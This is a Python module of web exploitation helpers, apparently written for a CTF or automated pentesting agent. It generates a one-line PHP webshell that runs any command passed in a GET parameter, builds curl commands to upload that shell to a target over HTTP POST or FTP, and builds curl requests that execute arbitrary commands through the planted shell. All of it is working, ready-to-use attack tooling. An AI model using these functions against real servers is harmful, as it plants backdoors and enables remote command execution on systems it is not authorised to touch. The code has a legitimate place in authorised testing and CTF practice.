"""
PHP webshell and curl utilities for web exploitation
"""
import shlex
from urllib.parse import quote_plus


def generate_php_webshell(target_url=None, port=None,
                          protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Upload and generate a basic PHP webshell and uploads it via HTTP or FTP

    Args:
        target_url: Target URL to upload shell to
        port: Port number to use (default: 80 for HTTP, 21 for FTP)
        protocol: Protocol to use - 'http' or 'ftp' (default: http)
        ctf: CTF object to use for context

    Returns:
        Tuple of (webshell content, upload command)
    """
    webshell = """<?php system($_GET['cmd']); ?>"""

    # Always return a tuple: (webshell_content, upload_command_or_None)
    upload_cmd = None

    if not target_url:
        return webshell, upload_cmd

    if not port:
        port = 21 if protocol == "ftp" else 80

    # Build upload command that reads the shell from stdin so we don't
    # create files on disk as a side-effect. Use shlex.quote to safely
    # embed the literal webshell in a shell-safe printf invocation.
    quoted = shlex.quote(webshell)
    if protocol == "ftp":
        upload_cmd = f"printf %s {quoted} | curl -T - ftp://{target_url}:{port}/shell.php"
    else:
        upload_cmd = (
            f"printf %s {quoted} | curl -X POST http://{target_url}:{port} "
            f"-F 'file=@-;filename=shell.php'"
        )

    return webshell, upload_cmd


def curl_webshell(url, command, cmd_param="cmd"):
    """
    Sends command to PHP webshell via curl

    Args:
        url: URL of the webshell
        command: Command to execute
        cmd_param: GET parameter name for command (default: cmd)

    Returns:
        Command to execute with curl
    """
    encoded_cmd = quote_plus(command)
    return f"curl '{url}?{cmd_param}={encoded_cmd}'"


def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Generates curl command to upload PHP webshell

    Args:
        url: Target URL for upload
        filename: Name of shell file (default: shell.php)
        ctf: CTF object to use for context

    Returns:
        Tuple of (webshell content, curl upload command)
    """
    shell, _ = generate_php_webshell()
    quoted = shlex.quote(shell)
    curl_cmd = (
        f"printf %s {quoted} | curl -X POST {url} -F 'file=@-;filename={filename}'"
    )
    return shell, curl_cmd
